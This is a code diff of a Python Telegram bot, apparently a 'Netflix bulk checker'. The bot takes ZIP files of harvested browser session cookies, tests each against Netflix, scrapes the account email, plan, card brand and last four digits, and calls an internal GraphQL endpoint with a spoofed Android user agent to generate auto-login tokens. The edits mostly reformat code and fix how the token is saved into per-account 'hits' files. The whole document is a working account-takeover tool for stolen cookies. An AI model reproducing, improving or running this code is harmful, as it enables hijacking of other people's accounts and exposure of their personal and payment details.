@@ -6,9 +6,8 @@ import threading
 import tempfile
 import zipfile
 import shutil
-from datetime import datetime
 from colorama import init, Fore, Style
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 import telebot
 import webbrowser
 
@@ -39,8 +38,7 @@ class NetflixBulkChecker:
             pass
 
     def get_country_flag(self, code):
-        flags = {'US': '🇺🇸', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'ES': '🇪🇸', 'IT': '🇮🇹',
-                 'TR': '🇹🇷', 'BR': '🇧🇷', 'JP': '🇯🇵', 'KR': '🇰🇷', 'IN': '🇮🇳'}
+        flags = {'US':'🇺🇸','GB':'🇬🇧','DE':'🇩🇪','FR':'🇫🇷','ES':'🇪🇸','IT':'🇮🇹','TR':'🇹🇷','BR':'🇧🇷','JP':'🇯🇵','KR':'🇰🇷','IN':'🇮🇳'}
         return flags.get(code.upper(), '🌍')
 
     def parse_netscape_cookie(self, text):
@@ -50,8 +48,7 @@ class NetflixBulkChecker:
         cookies = {}
         for line in text.split('\n'):
             line = line.strip()
-            if not line or line.startswith('#'):
-                continue
+            if not line or line.startswith('#'): continue
             parts = line.split('\t')
             if len(parts) >= 7:
                 cookies[parts[5]] = parts[6]
@@ -60,20 +57,17 @@ class NetflixBulkChecker:
     def check_cookie(self, cookie_text, source_name):
         try:
             cookies = self.parse_netscape_cookie(cookie_text)
-            if not cookies:
-                return None
+            if not cookies: return None
 
             session = requests.Session()
             for k, v in cookies.items():
                 session.cookies.set(k, v, domain='.netflix.com', path='/')
 
             r = session.get('https://www.netflix.com/account/membership', timeout=20, allow_redirects=True)
-            if 'login' in r.url.lower():
-                return None
+            if 'login' in r.url.lower(): return None
 
             html = r.text
-            if '"membershipStatus":"CURRENT_MEMBER"' not in html:
-                return None
+            if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
 
             result = {
                 'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
@@ -88,11 +82,16 @@ class NetflixBulkChecker:
                 'cookie': cookie_text.strip()
             }
 
+            # Generate and save NF Token properly
             try:
                 nftoken = self.generate_nftoken(cookies)
                 if nftoken:
                     result['login_url'] = f"https://netflix.com/account?nftoken={nftoken}"
+                    result['nftoken'] = nftoken
+                else:
+                    result['nftoken'] = "N/A"
             except:
+                result['nftoken'] = "N/A"
                 result['login_url'] = "N/A"
 
             return result
@@ -105,20 +104,11 @@ class NetflixBulkChecker:
             session = requests.Session()
             for name, value in cookies_dict.items():
                 session.cookies.set(name, value, domain='.netflix.com', path='/')
-
-            payload = {
-                "operationName": "CreateAutoLoginToken",
-                "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
-                "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}
-            }
-            headers = {
-                'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)',
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            }
-
-            response = session.post('https://android13.prod.ftl.netflix.com/graphql',
-                                    headers=headers, json=payload, timeout=15)
+            
+            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
+            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
+            
+            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=15)
             if response.status_code == 200:
                 data = response.json()
                 if data.get('data', {}).get('createAutoLoginToken'):
@@ -142,7 +132,7 @@ class NetflixBulkChecker:
             if result:
                 self.stats['hits'] += 1
                 self.premium_accounts.append(result)
-
+                
                 os.makedirs('hits', exist_ok=True)
                 fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
                 with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
@@ -155,8 +145,7 @@ class NetflixBulkChecker:
                     f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
                     f.write(f"Profiles: {result['profiles']}\n")
                     f.write(f"Login URL: {result.get('login_url', 'N/A')}\n")
-                    f.write(f"NF Token: {result.get('login_url', 'N/A')}\n")  # Added NF Token clearly
-
+                    f.write(f"NF Token: {result.get('nftoken', 'N/A')}\n")   # ← Fixed & Clean
                 print(f"{Fore.GREEN}[✓] HIT #{self.stats['hits']}: {result['email']} - {result['plan']}{Style.RESET_ALL}")
             else:
                 self.stats['bad'] += 1
@@ -176,12 +165,11 @@ class NetflixBulkChecker:
         print(f"\n✅ Finished! Total Hits: {self.stats['hits']}")
 
 
-# ====================== BOT HANDLERS ======================
+# ====================== BOT ======================
 
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     bot.reply_to(message, "📤 Send me ZIP file containing your .txt cookies (one account per file)")
-
 
 @bot.message_handler(content_types=['document'])
 def handle_zip(message):
@@ -189,7 +177,7 @@ def handle_zip(message):
         bot.reply_to(message, "❌ Please send a .zip file")
         return
 
-    bot.reply_to(message, "✅ ZIP received. Starting bulk check...")
+    bot.reply_to(message, "✅ ZIP received. Starting check...")
 
     try:
         file_info = bot.get_file(message.document.file_id)
@@ -209,20 +197,14 @@ def handle_zip(message):
             checker.chat_id = str(message.chat.id)
             checker.start(extract_dir)
 
-            # Only send final hits ZIP (No individual messages)
             if os.path.exists("hits") and os.listdir("hits"):
                 hits_zip = os.path.join(tmp, "hits.zip")
                 with zipfile.ZipFile(hits_zip, 'w') as z:
                     for root, _, fs in os.walk("hits"):
                         for file in fs:
                             z.write(os.path.join(root, file), file)
-
                 with open(hits_zip, "rb") as f:
-                    bot.send_document(
-                        message.chat.id,
-                        f,
-                        caption="🎉 All Hits Ready!\nFull details + NF Token + Cookie saved in each file."
-                    )
+                    bot.send_document(message.chat.id, f, caption="🎉 All Hits Saved!\nEach file contains Full Cookie + NF Token")
                 shutil.rmtree("hits", ignore_errors=True)
             else:
                 bot.reply_to(message, "❌ No hits found.")
